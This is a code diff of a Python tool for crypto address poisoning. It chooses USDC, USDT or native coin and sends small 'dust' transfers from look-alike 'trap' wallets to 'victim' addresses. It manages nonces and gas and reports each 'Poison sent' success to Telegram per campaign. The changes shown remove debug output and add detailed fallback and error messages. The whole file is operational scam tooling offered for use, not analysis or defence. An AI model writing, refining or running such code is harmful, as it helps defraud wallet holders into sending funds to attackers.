@@ -276,19 +276,17 @@ def call_with_retry(func, *args, max_attempts=3, base_delay=1, **kwargs):
 
 def get_token_balance(address, token_symbol):
     token_addr = TOKEN_CONFIG.get(token_symbol)
-    print(f"[DEBUG] get_token_balance: symbol={token_symbol}, config_addr={token_addr}")
     if not token_addr:
         return 0
     token = w3.eth.contract(address=w3.to_checksum_address(token_addr), abi=ERC20_ABI)
     try:
         balance = call_with_retry(token.functions.balanceOf, address).call()
-        print(f"[DEBUG] get_token_balance: {address} has {balance} of {token_symbol}")
         return balance
     except Exception as e:
         logger.warning(f"Failed to get token balance for {address}: {e}")
         return 0
 
-# ─── Modified choose_asset with preferred asset support ───
+# ─── Modified choose_asset with detailed messaging support ───
 def choose_asset(victim, trap, preferred_asset=None):
     victim_usdc = get_token_balance(victim, "USDC")
     trap_usdc = get_token_balance(trap, "USDC")
@@ -298,68 +296,71 @@ def choose_asset(victim, trap, preferred_asset=None):
     victim_usdt = get_token_balance(victim, "USDT")
     trap_usdt = get_token_balance(trap, "USDT")
     
-    # Fetch native balances for preferred asset logic
     trap_native_bal = call_with_retry(w3.eth.get_balance, trap)
     victim_native_bal = call_with_retry(w3.eth.get_balance, victim)
     
     force_stable = os.getenv("FORCE_STABLECOIN_DUST", "").lower() == "true"
 
-    print(f"\n[DEBUG] === BALANCE CHECK ===")
-    print(f"[DEBUG] Trap Native: {trap_native_bal} | Victim Native: {victim_native_bal}")
-    print(f"[DEBUG] Trap USDC: {trap_usdc} | Victim USDC: {victim_usdc}")
-    print(f"[DEBUG] Trap USDT: {trap_usdt} | Victim USDT: {victim_usdt}")
-    print(f"[DEBUG] DUST_AMOUNT config: {DUST_AMOUNT}")
-    print(f"[DEBUG] FORCE_STABLECOIN_DUST: {force_stable}")
-    print(f"[DEBUG] PREFERRED_ASSET: {preferred_asset}")
+    def fmt(balance, decimals):
+        return f"{balance / (10**decimals):.6f}"
 
-    # 1. If a preferred asset is specified (from re_poison.js), try to use it first
+    usdc_decimals = 6
+    usdc_dust = DUST_AMOUNT.get("USDC", 0)
+    usdt_decimals = 6
+    usdt_dust = DUST_AMOUNT.get("USDT", 0)
+
+    # Check viability
+    usdc_ok = trap_usdc >= usdc_dust and (victim_usdc > 0 or force_stable)
+    usdt_ok = trap_usdt >= usdt_dust and (victim_usdt > 0 or force_stable)
+
+    # 1. Try preferred asset first
     if preferred_asset:
-        asset_key = preferred_asset.upper()
-        if asset_key in DUST_AMOUNT:
-            dust_amount = DUST_AMOUNT[asset_key]
-            
-            # Check if trap has enough of this asset
-            has_balance = False
-            if asset_key == NATIVE_SYMBOL:
-                has_balance = trap_native_bal >= dust_amount
-            else:
-                token_balance = get_token_balance(trap, asset_key)
-                has_balance = token_balance >= dust_amount
-            
-            # If trap has it, use it (bypass victim balance check for re-poison reliability)
-            if has_balance:
-                print(f"[DEBUG] ✅ Selected PREFERRED_ASSET: {asset_key}")
-                return (asset_key, dust_amount)
-        else:
-            print(f"[DEBUG] ⚠️ PREFERRED_ASSET {asset_key} not in DUST_AMOUNT config. Falling back.")
+        pref_upper = preferred_asset.upper()
+        if pref_upper == "USDC" and usdc_ok:
+            msg = f"ℹ️ Using USDC because trap USDT balance ({fmt(trap_usdt, usdt_decimals)}) is below the dust threshold ({fmt(usdt_dust, usdt_decimals)})." if not usdt_ok else None
+            return ("USDC", usdc_dust, msg)
+        elif pref_upper == "USDT" and usdt_ok:
+            msg = f"ℹ️ Using USDT because trap USDC balance ({fmt(trap_usdc, usdc_decimals)}) is below the dust threshold ({fmt(usdc_dust, usdc_decimals)})." if not usdc_ok else None
+            return ("USDT", usdt_dust, msg)
+        elif pref_upper == NATIVE_SYMBOL and trap_native_bal >= DUST_AMOUNT.get(NATIVE_SYMBOL, 0):
+            return (NATIVE_SYMBOL, DUST_AMOUNT.get(NATIVE_SYMBOL, 0), None)
 
-    # 2. Original fallback logic (USDC / USDT)
-    if "USDC" in DUST_AMOUNT:
-        dust_amount = DUST_AMOUNT["USDC"]
-        if trap_usdc_native >= dust_amount and (victim_usdc_native > 0 or force_stable):
-            print("[DEBUG] ✅ Selected USDC_NATIVE")
-            return ("USDC_NATIVE", dust_amount)
-        if trap_usdc >= dust_amount and (victim_usdc > 0 or force_stable):
-            print("[DEBUG] ✅ Selected USDC")
-            return ("USDC", dust_amount)
-        else:
-            print("[DEBUG] ❌ USDC skipped: Trap balance too low OR Victim balance is 0 (and force_stable is false)")
+    # 2. Fallback to USDC
+    if usdc_ok:
+        msg = f"ℹ️ Using USDC because trap USDT balance ({fmt(trap_usdt, usdt_decimals)}) is below the dust threshold ({fmt(usdt_dust, usdt_decimals)})." if (preferred_asset and preferred_asset.upper() == "USDT" and not usdt_ok) else None
+        return ("USDC", usdc_dust, msg)
 
-    if "USDT" in DUST_AMOUNT:
-        dust_amount = DUST_AMOUNT["USDT"]
-        if trap_usdt >= dust_amount and (victim_usdt > 0 or force_stable):
-            print("[DEBUG] ✅ Selected USDT")
-            return ("USDT", dust_amount)
-        else:
-            print("[DEBUG] ❌ USDT skipped: Trap balance too low OR Victim balance is 0 (and force_stable is false)")
+    # 3. Fallback to USDT
+    if usdt_ok:
+        msg = f"ℹ️ Using USDT because trap USDC balance ({fmt(trap_usdc, usdc_decimals)}) is below the dust threshold ({fmt(usdc_dust, usdc_decimals)})." if (preferred_asset and preferred_asset.upper() == "USDC" and not usdc_ok) else None
+        return ("USDT", usdt_dust, msg)
 
-    print('[DEBUG] 🛑 No suitable stablecoin found in trap, or victim does not hold stablecoins. Skipping dust.')
-    return (None, 0)
+    # 4. Neither is ok. Build detailed error message.
+    reasons = []
+    
+    if trap_usdc < usdc_dust:
+        reasons.append(f"Trap USDC balance ({fmt(trap_usdc, usdc_decimals)}) is below the dust threshold ({fmt(usdc_dust, usdc_decimals)}).")
+    elif victim_usdc == 0 and not force_stable:
+        reasons.append("Victim has 0 USDC balance.")
+        
+    if trap_usdt < usdt_dust:
+        reasons.append(f"Trap USDT balance ({fmt(trap_usdt, usdt_decimals)}) is below the dust threshold ({fmt(usdt_dust, usdt_decimals)}).")
+    elif victim_usdt == 0 and not force_stable:
+        reasons.append("Victim has 0 USDT balance.")
+
+    if preferred_asset and preferred_asset.upper() == NATIVE_SYMBOL:
+        native_dust = DUST_AMOUNT.get(NATIVE_SYMBOL, 0)
+        if trap_native_bal < native_dust:
+            reasons.append(f"Preferred native asset {NATIVE_SYMBOL} balance ({fmt(trap_native_bal, 18)}) is below the dust threshold ({fmt(native_dust, 18)}).")
+
+    error_msg = "❌ No suitable stablecoin found to send dust.\nDetails:\n" + "\n".join([f"• {r}" for r in reasons]) if reasons else "❌ No suitable stablecoin found."
+    
+    return (None, 0, error_msg)
 
 _last_low_balance_alert = {}
 _local_nonces = {}
 
-# ─── Modified send_dust to support native transfers ───
+# ─── Modified send_dust to support detailed messaging ───
 def send_dust(private_key, victim_address, campaign_id=None):
     try:
         victim = w3.to_checksum_address(victim_address)
@@ -369,15 +370,18 @@ def send_dust(private_key, victim_address, campaign_id=None):
 
         # Pass preferred_asset from environment to choose_asset
         preferred_from_env = os.getenv("DUST_ASSET")
-        asset, dust = choose_asset(victim, trap, preferred_from_env)
+        asset, dust, info_msg = choose_asset(victim, trap, preferred_from_env)
+        
         if asset is None:
-            msg = f"❌ No suitable stablecoin found to send dust from trap {trap} to victim {victim}."
+            msg = info_msg or f"❌ No suitable stablecoin found to send dust from trap {trap} to victim {victim}."
             logger.warning(msg)
             print('[DEBUG] No asset found. Aborting.')
             send_telegram(msg, campaign_id=campaign_id)
             return False
             
         logger.info(f"Chosen asset: {asset}, dust: {dust} units")
+        if info_msg:
+            logger.info(info_msg)
 
         # --- BULLETPROOF HYBRID NONCE MANAGEMENT ---
         rpc_nonce = call_with_retry(w3.eth.get_transaction_count, trap, "pending")
@@ -439,7 +443,7 @@ def send_dust(private_key, victim_address, campaign_id=None):
             tx = tx_payload
             required_eth = (21000 * effective_gas_price) + dust
         else:
-            # ERC-20 transfer logic (existing)
+            # ERC-20 transfer logic
             token_addr = TOKEN_CONFIG.get(asset)
             if not token_addr:
                 logger.error(f"Unknown token {asset}")
@@ -516,8 +520,14 @@ def send_dust(private_key, victim_address, campaign_id=None):
                 decimals = config.get_token_decimals().get(asset, 6) if hasattr(config, 'get_token_decimals') else 6
             except AttributeError:
                 decimals = 6
-            logger.info(f"Dust sent: {dust} units ({dust / 10**decimals:.6f} {asset})")
-            send_telegram(f"✅ Poison sent\nVictim: {victim}\nTrap: {trap}\nTX: {tx_hash.hex()}", campaign_id=campaign_id)
+            
+            # 🚀 NEW: Enhanced success message that includes the fallback explanation if applicable
+            success_msg = f"✅ Poison sent successfully!\nVictim: {victim}\nTrap: {trap}\nAmount: {dust / 10**decimals:.6f} {asset}\nTX: {tx_hash.hex()}"
+            
+            if info_msg:
+                success_msg += f"\n\n{info_msg}"
+                
+            send_telegram(success_msg, campaign_id=campaign_id)
             return True
         else:
             logger.error("Transaction reverted")
